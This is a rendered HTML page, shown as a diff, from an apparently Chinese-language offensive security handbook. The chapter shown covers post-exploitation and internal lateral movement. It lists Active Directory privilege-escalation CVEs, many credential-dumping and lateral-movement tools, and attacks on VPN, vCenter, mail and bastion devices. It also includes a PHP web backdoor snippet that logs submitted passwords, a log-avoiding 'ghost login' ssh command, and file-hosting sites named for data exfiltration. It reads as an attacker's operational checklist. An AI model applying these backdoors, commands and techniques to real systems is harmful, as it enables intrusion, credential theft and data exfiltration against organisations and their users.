+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. 远控工具开发
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. 木马免杀
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. 调证镜像系统还原(Linux)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. 实战字典与工具包
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. AI赋能攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. 云原生攻防
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. 现代C2演进
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. 高级规避技术
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. 最新AD/基础设施攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-17/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. 初始访问演进
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-18/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Cloud Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-19/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. HW/红蓝对抗实战专题
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. 零信任环境绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-21/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. OT/ICS工控安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-22/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. 移动端攻击
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-23/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Living off the Land (LotL) 攻击链
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. 过时内容警告与替代方案
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    附录 — 原始大纲
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#51" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.1 域渗透提权
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#52" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.2 服务器提权
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#53-rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.3 RPC域内信息收集与横向移动
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.3 RPC域内信息收集与横向移动">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        横向移动工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RPC工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#54" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.4 域内凭证及口令收集
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#55" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.5 权限维持
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.5 权限维持">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows后门
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Linux后门
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修改源码插入后门
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#56" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.6 内网核心设备攻防
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.6 内网核心设备攻防">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NAS攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        邮服攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        堡垒机攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vcenter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        vCenter攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vdi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VDI云桌面攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vpn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        VPN设备攻击
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#57" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5.7 非域内网渗透
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5.7 非域内网渗透">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        入口方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#linux-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Linux getshell后操作
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#windows_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        数据外传
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        横向移动
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        找域
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TV/向日葵
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="5">5. 后渗透与内网横向</h1>
+<h2 id="51">5.1 域渗透提权</h2>
+<p><strong>凭证基础</strong>: NTLM流程 → winlogon.exe接收密码 → lsass.exe比对SAM</p>
+<p><strong>票据类型</strong>: 黄金票据 / 白银票据 / 钻石票据 / 蓝宝石票据</p>
+<p><strong>委派攻击</strong>: 非约束委派 / 约束委派 / 基于资源的约束委派(RBCD)</p>
+<p><strong>关键CVE速查</strong>:
+| CVE | 名称 | 核心原理 |
+|-----|------|---------|
+| MS14-068 | PAC伪造 | KDC对PAC签名算法无验证→伪造高权限PAC(512/520/518/519) → 利用前提: 域控未打KB3011780补丁 + 域内计算机 + 域用户密码和SID |
+| CVE-2020-1472 | Zerologon | AES-CFB8加密全零明文→1/256概率全零密文→NetrServerPasswordSet2置空密码(516字节零→空密码) |
+| CVE-2021-1675/34527 | PrintNightmare | RpcAddPrinterDriver无需SeLoadDriverPrivilege→SYSTEM RCE(Print Spooler服务) |
+| CVE-2021-42287+42278 | noPac | 机器账户名不以$结尾→创建与DC同名账户→请求TGT→改名→S4U2Self→高权限ST。MS-DS-Machine-Account-Quota=0时需对账户有写权限(GenericAll/加域账号) |
+| CVE-2022-26923 | ADCS | DNSHostname修改→证书欺骗 |</p>
+<p><strong>通过WSUS/SCCM提权</strong>:
+- <a href="https://github.com/AlsidOfficial/WSUSpendu">WSUSpendu</a> - 域内补丁更新服务器，原理类似EDR总控下发文件命令
+- <a href="https://github.com/xpn/sccmwtf">sccmwtf</a> - 推PowerShell</p>
+<p><strong>通过AzureAD提权</strong>: Azure AD Sync → 获取同步账户 → DC Sync</p>
+<p><strong>打邮服</strong>: 域管登录过 / 翻邮件 / WriteACL权限→给自己dsync权限(<a href="https://github.com/dirkjanm/PrivExchange">PrivExchange</a>)</p>
+<p><strong>堡垒机/运维机</strong>: web后门偷密码</p>
+<p><strong>web后门偷密码</strong>:
+<div class="highlight"><pre><span></span><code><span class="x">if ($_SERVER['REQUEST_METHOD'] == 'POST') {</span>
+<span class="x">    $username = $_POST['username'];</span>
+<span class="x">    $password = $_POST['password'];</span>
+<span class="x">    $data = $username . ':' . $password . PHP_EOL;</span>
+<span class="x">    file_put_contents('users.txt', $data, FILE_APPEND | LOCK_EX);</span>
+<span class="x">}</span>
+</code></pre></div></p>
+<p><strong>抓取域管登陆服务器的hash</strong> / <strong>找密码本</strong> / <strong>找特权组用户</strong>(Administrator/Backup Operators)</p>
+<p><strong>NTLM中继工具</strong>: Responder / Inveigh / multirelayx.py / PrinterBug / PetitPotam / DFSCoerce / ShadowCoerce / PrivExchange / <a href="https://github.com/p0dalirius/Coercer">Coercer</a></p>
+<p><strong>通过Distributed-COM-Users/Performance-Log-Users权限获得域控权限</strong>: <a href="https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/">参考</a></p>
+<p><strong>分析组策略</strong>: <a href="https://github.com/synacktiv/gpoParser/tree/main">gpoParser</a></p>
+<p><strong>域内自动化</strong>: <a href="https://github.com/evilashz/PIGADVulnScanner">PIGADVulnScanner</a></p>
+<h2 id="52">5.2 服务器提权</h2>
+<p><strong>Potato系列原理</strong>:
+- SeImpersonate: 身份验证后模拟客户端(Windows 2000 SP4 / SCM启动的服务 / COM基础设施 / 本地管理员 / 本地服务账户)
+  - 查看位置: <code>gpedit → Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment</code>
+  - 这是给线程的权限</p>
+<ul>
+<li><strong>COM基础</strong>:</li>
+<li>IUnknown接口: QueryInterface(dynamic_cast) / AddRef(引用计数) / Release</li>
+<li>COM事件: event_source / event_receiver</li>
+<li>BSTR: 分配时前面额外4字节长度字段</li>
+<li>内存: CoTaskMemAlloc / CoTaskMemFree</li>
+<li>
+<p>__uuidof / IID_PPV_ARGS / SafeRelease / CComPtr(不显式调用Release)</p>
+</li>
+<li>
+<p><strong>Rotten Potato</strong>:</p>
+</li>
+<li>SSPI(Security Support Provider Interface): NTLM SSP(Challenge/Response) / Kerberos(ticket)</li>
+<li>CoGetInstanceFromIStorage</li>
+<li>参考: <a href="https://github.com/breenmachine/RottenPotatoNG">RottenPotatoNG</a> / <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Foxglove Security</a></li>
+</ul>
+<p><strong>内核漏洞提权</strong></p>
+<h2 id="53-rpc">5.3 RPC域内信息收集与横向移动</h2>
+<h3 id="_1">横向移动工具</h3>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/XiaoliChan/wmiexec-Pro">wmiexec-Pro</a></td>
+<td>Win32_ScheduledJob</td>
+</tr>
+<tr>
+<td><a href="https://github.com/JDArmy/NO445-lateral-movement">NO445-lateral-movement</a></td>
+<td>Win32_Process</td>
+</tr>
+<tr>
+<td><a href="https://github.com/rootclay/WMIHACKER">WMIHACKER</a></td>
+<td>WMI命令执行</td>
+</tr>
+<tr>
+<td><a href="https://github.com/XiaoliChan/wmiexec-RegOut">wmiexec-RegOut</a></td>
+<td>注册表回显</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Mr-Un1k0d3r/SCShell">SCShell</a></td>
+<td>ChangeServiceConfigW</td>
+</tr>
+<tr>
+<td><a href="https://github.com/airzero24/WMIReg">WMIReg</a></td>
+<td>StdRegProv</td>
+</tr>
+<tr>
+<td><a href="https://github.com/lexfo/rpc2socks">rpc2socks</a></td>
+<td>SOCKS代理</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Marshall-Hallenbeck/ms_scmr">ms_scmr</a></td>
+<td>上传文件</td>
+</tr>
+<tr>
+<td><a href="https://github.com/zyn3rgy/smbtakeover">smbtakeover</a></td>
+<td>解除445/tcp绑定</td>
+</tr>
+<tr>
+<td><a href="https://github.com/WKL-Sec/dcomhijack">dcomhijack</a></td>
+<td>DCOM相关DLL劫持</td>
+</tr>
+<tr>
+<td><a href="https://github.com/zcgonvh/TaskSchedulerMisc">TaskSchedulerMisc</a></td>
+<td>MS-TSCH计划任务</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_2">信息收集</h3>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/JDArmy/RPCSCAN">RPCSCAN</a></td>
+<td>ms-epmap</td>
+</tr>
+<tr>
+<td><a href="https://github.com/StarfireLab/EFSRPCrpc">EFSRPCrpc</a></td>
+<td>EFSRPC-ping</td>
+</tr>
+</tbody>
+</table>
+<h3 id="rpc">RPC工具</h3>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/sogeti-esec-lab/RPCForge">RPCForge</a></td>
+<td>RPC Fuzz</td>
+</tr>
+<tr>
+<td><a href="https://github.com/hfiref0x/WinObjEx64">WinObjEx64</a></td>
+<td>Windows对象查看器</td>
+</tr>
+<tr>
+<td><a href="https://github.com/tothi/serviceDetector">serviceDetector</a></td>
+<td>连接445通过ms-lsat查询已安装服务</td>
+</tr>
+<tr>
+<td><a href="https://github.com/cyberark/RPCMon">RPCMon</a></td>
+<td>监控RPC</td>
+</tr>
+<tr>
+<td><a href="https://github.com/zodiacon/WFPExplorer">WFPExplorer</a></td>
+<td>Windows过滤平台对象</td>
+</tr>
+<tr>
+<td><a href="https://github.com/CICADA8-Research/COMThanasia">COMThanasia</a></td>
+<td>COM对象分析</td>
+</tr>
+</tbody>
+</table>
+<h2 id="54">5.4 域内凭证及口令收集</h2>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/ly4k/PassTheChallenge">PassTheChallenge</a></td>
+<td>Credential Guard绕过</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ly4k/Pypykatz">Pypykatz</a></td>
+<td>Python mimikatz</td>
+</tr>
+<tr>
+<td><a href="https://github.com/praetorian-inc/ADFSRelay">ADFSRelay</a></td>
+<td>ADFS认证Relay</td>
+</tr>
+<tr>
+<td><a href="https://github.com/med0x2e/NTLMRelay2Self">NTLMRelay2Self</a></td>
+<td>Web Relay</td>
+</tr>
+<tr>
+<td><a href="https://github.com/deepinstinct/Lsass-Shtinkering">Lsass-Shtinkering</a></td>
+<td>Windows错误报告服务</td>
+</tr>
+<tr>
+<td><a href="https://github.com/tothi/rbcd-attack">rbcd-attack</a></td>
+<td>资源约束委派</td>
+</tr>
+<tr>
+<td><a href="https://github.com/wjlab/Darksteel">Darksteel</a></td>
+<td>域内自动化信息搜集</td>
+</tr>
+<tr>
+<td><a href="https://github.com/lele8/SharpUserIP">SharpUserIP</a></td>
+<td>域控/远程提取登录日志→域用户IP</td>
+</tr>
+<tr>
+<td><a href="https://github.com/aleenzz/ADExplorerX">ADExplorerX</a></td>
+<td>AD浏览器</td>
+</tr>
+<tr>
+<td><a href="https://github.com/outflanknl/Dumpert">Dumpert</a></td>
+<td>System Calls转储(旧)</td>
+</tr>
+<tr>
+<td><a href="https://github.com/zblurx/certsync">certsync</a></td>
+<td>证书利用</td>
+</tr>
+<tr>
+<td><a href="https://github.com/battleoverflow/lsass-dump">lsass-dump</a></td>
+<td>导出简单演示</td>
+</tr>
+<tr>
+<td><a href="https://github.com/0x727/UserRegEnum_0x727">UserRegEnum_0x727</a></td>
+<td>域内普通域用户权限查找所有计算机上登录用户</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Avienma/DumpHash">DumpHash</a></td>
+<td>干净hash导出(需高权限)</td>
+</tr>
+<tr>
+<td><a href="https://github.com/GamehunterKaan/Plog">Plog</a></td>
+<td>mimikatz导出密码模块</td>
+</tr>
+<tr>
+<td><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></td>
+<td>只读DPAPI</td>
+</tr>
+<tr>
+<td><a href="https://github.com/mdsecactivebreach/DragonCastle">DragonCastle</a></td>
+<td>DLL劫持读hash</td>
+</tr>
+<tr>
+<td><a href="https://github.com/expl0itabl3/EZDump">EZDump</a></td>
+<td>简单导出C#</td>
+</tr>
+<tr>
+<td><a href="https://github.com/nettitude/ETWHash">ETWHash</a></td>
+<td>利用ETW事件读hash</td>
+</tr>
+<tr>
+<td><a href="https://github.com/4ndr34z/ntlmthief">ntlmthief</a></td>
+<td>利用SSPI读hash</td>
+</tr>
+<tr>
+<td><a href="https://github.com/gabriellandau/PPLFault">PPLFault</a></td>
+<td>攻击PPL进程保护读hash</td>
+</tr>
+<tr>
+<td><a href="https://github.com/grimlockx/ADCSKiller">ADCSKiller</a></td>
+<td>ADCS利用工具</td>
+</tr>
+<tr>
+<td><a href="https://github.com/OmriBaso/RToolZ">RToolZ</a></td>
+<td>ProcExp152.sys驱动转储PPL Lsass</td>
+</tr>
+<tr>
+<td><a href="https://github.com/BeichenDream/SharpToken">SharpToken</a></td>
+<td>找系统中所有进程泄露的Token</td>
+</tr>
+<tr>
+<td><a href="https://github.com/S12cybersecurity/RDPCredentialStealer">RDPCredentialStealer</a></td>
+<td>Detours API Hook读RDP登录凭证</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Heart-Sky/ListRDPConnections">ListRDPConnections</a></td>
+<td>列出所有RDP连接记录</td>
+</tr>
+<tr>
+<td><a href="https://github.com/0neAtSec/SharpDomainInfo">SharpDomainInfo</a></td>
+<td>自动化信息收集</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Tw1sm/spraycharles">spraycharles</a></td>
+<td>慢速密码喷射</td>
+</tr>
+<tr>
+<td><a href="https://github.com/synacktiv/GPOddity">GPOddity</a></td>
+<td>GPO利用</td>
+</tr>
+<tr>
+<td><a href="https://github.com/grayhatkiller/SharpExShell">SharpExShell</a></td>
+<td>-</td>
+</tr>
+<tr>
+<td><a href="https://github.com/djackreuter/proc_noprocdump">proc_noprocdump</a></td>
+<td>-</td>
+</tr>
+<tr>
+<td><a href="https://github.com/mtth-bfft/adeleg">adeleg</a></td>
+<td>查所有委派</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ricardojoserf/NativeDump">NativeDump</a></td>
+<td>-</td>
+</tr>
+<tr>
+<td><a href="https://github.com/MzHmO/LeakedWallpaper">LeakedWallpaper</a></td>
+<td>从session提取hash</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Offensive-Panda/LsassReflectDumping">LsassReflectDumping</a></td>
+<td>-</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Offensive-Panda/ShadowDumper">ShadowDumper</a></td>
+<td>多种方式导出hash</td>
+</tr>
+</tbody>
+</table>
+<h2 id="55">5.5 权限维持</h2>
+<h3 id="windows">Windows后门</h3>
+<ul>
+<li>自启动后门</li>
+<li><a href="https://github.com/mdsecactivebreach/WMIPersistence">WMIPersistence</a></li>
+<li><a href="https://github.com/netero1010/GhostTask">GhostTask</a></li>
+</ul>
+<h3 id="linux">Linux后门</h3>
+<ul>
+<li>PAM后门</li>
+<li>tsh后门</li>
+</ul>
+<h3 id="_3">修改源码插入后门</h3>
+<h2 id="56">5.6 内网核心设备攻防</h2>
+<h3 id="nas">NAS攻击</h3>
+<ul>
+<li>弱口令(Web管理界面) / 未授权访问 / 已知CVE(NAS厂商特定)</li>
+<li>共享文件(SMB/NFS) → 敏感文档(合同/密码本/架构图)</li>
+<li>同步服务漏洞 → RCE → 横向到其他内网资产</li>
+</ul>
+<h3 id="_4">邮服攻击</h3>
+<ul>
+<li>Exchange: ProxyLogon/ProxyShell/ProxyNotShell系列 / 规则后门</li>
+<li>Coremail: 历史漏洞利用 / 管理后台弱口令</li>
+<li>翻邮件找: 域管凭证 / VPN账密 / 内部系统地址 / 机密附件</li>
+<li>配合Outlook规则持久化 / 邮件转发规则窃密</li>
+</ul>
+<h3 id="_5">堡垒机攻击</h3>
+<ul>
+<li>JumpServer历史CVE / 管理后台弱口令 / Session录像泄露凭证</li>
+<li>通过堡垒机跳板到所有纳管资产(全链路横向)</li>
+</ul>
+<h3 id="vcenter">vCenter攻击</h3>
+<ul>
+<li>CVE-2021-21972(vSphere Client RCE) / CVE-2021-21985 / CVE-2021-22005</li>
+<li>SAML Token伪造(黄金票据变体) → 控制所有VM</li>
+<li>通过vCenter获取所有虚拟机快照/内存dump→提取凭证</li>
+<li>工具: <a href="https://github.com/SGGS-POC/vCenter-Attack">vCenter-Attack</a></li>
+</ul>
+<h3 id="vdi">VDI云桌面攻击</h3>
+<ul>
+<li>Citrix/VMware Horizon/RDP网关漏洞</li>
+<li>Cookie泄露→无需认证直接连接桌面</li>
+<li>影子文件窃取(BrowserPivot)</li>
+<li>登录凭证抓取(RDPCredentialStealer)</li>
+</ul>
+<h3 id="vpn">VPN设备攻击</h3>
+<ul>
+<li>Fortinet: CVE-2022-42475 / CVE-2023-27997 / CVE-2024-21762 → SSL VPN RCE</li>
+<li>Palo Alto: CVE-2024-3400 → GlobalProtect RCE(无需认证)</li>
+<li>Ivanti: CVE-2023-46805+CVE-2024-21887 → 认证绕过+RCE</li>
+<li>VPN cookie窃取/重放 → 直接接入内网</li>
+<li>持久化: 植入后门到VPN设备固件→长期中间人</li>
+</ul>
+<h2 id="57">5.7 非域内网渗透</h2>
+<h3 id="_6">入口方式</h3>
+<table>
+<thead>
+<tr>
+<th>入口</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web打点(Linux getshell)</td>
+<td>重新爬取web源码→敏感信息(secretkey/硬编码/URL) / 拖回审代码→更多漏洞维持权限 / 找web可访达目录→放马</td>
+</tr>
+<tr>
+<td>VPN</td>
+<td>漏洞获取shell / 漏洞泄露用户名密码(fortinet) / 漏洞泄露cookie(云桌面→勒索) / 流量清晰可见→快速找跳板机</td>
+</tr>
+<tr>
+<td>SSO</td>
+<td>DNS劫持绕过二次验证 / 注意设备登录提醒 / OAuth漏洞</td>
+</tr>
+<tr>
+<td>单挂Windows</td>
+<td>注册表信息收集 / 找敏感文件 / RDP劫持</td>
+</tr>
+</tbody>
+</table>
+<h3 id="linux-getshell">Linux getshell后操作</h3>
+<ul>
+<li>找本机关键信息: hosts / history / .viminfo / SSH私钥</li>
+<li>PAM抓SSH密码(SO文件本地搭环境自己编译)</li>
+<li>扫内存: <a href="https://github.com/liamg/dismember">dismember</a></li>
+<li><a href="https://platypus-reverse-shell.vercel.app">Platypus</a></li>
+<li>找目录: <code>find / -writable -type d 2&gt;/dev/null</code> / <code>find / -perm -222 -type d</code> / <code>find / \( -perm -o w -perm -o x \) -type d</code></li>
+<li>查iptables</li>
+<li>幽灵登录: <code>ssh -T root@192.168.1.1 /usr/bin/bash -i</code> (不分配伪终端无日志有连接)</li>
+<li>搜索特定字符串: <code>grep -rn "jdbc:oracle" /opt/</code></li>
+</ul>
+<h3 id="windows_1">Windows信息收集</h3>
+<ul>
+<li>注册表: <a href="https://github.com/SpecterOps/Nemesis">Nemesis</a></li>
+<li>敏感文件: <a href="https://github.com/c1y2m3/FileSearch">FileSearch</a> / <a href="https://github.com/Naturehi666/searchall">searchall</a> / <a href="https://github.com/mandiant/msi-search">msi-search</a> / <a href="https://github.com/AabyssZG/FindEverything">FindEverything</a></li>
+<li>指定磁盘搜索: <code>dir D:\ /S /B | find "orange1.jsp"</code></li>
+<li>全盘搜索: <code>cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2&gt;nul | findstr "ToDesk_Lite.exe""</code></li>
+<li>RDP劫持: <a href="https://github.com/S12cybersecurity/RDPCredentialStealer">RDPCredentialStealer</a> / <a href="https://github.com/GoSecure/pyrdp">pyrdp</a> / <a href="https://github.com/0x09AL/RdpThief">RdpThief</a></li>
+<li>历史记录: cmd下<code>doskey /history</code> / PowerShell下<code>Get-History</code></li>
+<li>远控开发: 执行命令+列目录+云OSS+Git</li>
+<li>修改文件时间: <code>attrib +s +h +r 1.txt</code></li>
+</ul>
+<h3 id="_7">数据外传</h3>
+<ul>
+<li>OneDrive / OSSutil / GitHub LFS</li>
+<li><a href="https://gofile.io/">gofile.io</a> / <a href="https://send.cm/">send.cm</a> / <a href="https://krakenfiles.com/">krakenfiles</a> / <a href="https://download.ru/">download.ru</a></li>
+</ul>
+<h3 id="_8">横向移动</h3>
+<ul>
+<li><strong>Web端口</strong>: 常见web端口 / 服务器信息收集到的web端口(log/连接)</li>
+<li><strong>其他端口漏洞</strong>: <a href="https://github.com/AabyssZG/Docker-TCP-Scan">Docker-TCP-Scan</a> / 做字典密码喷射(连接工具→<a href="https://github.com/team-ide/teamide">teamide</a>) / 数据库getshell / Kubernetes:8443</li>
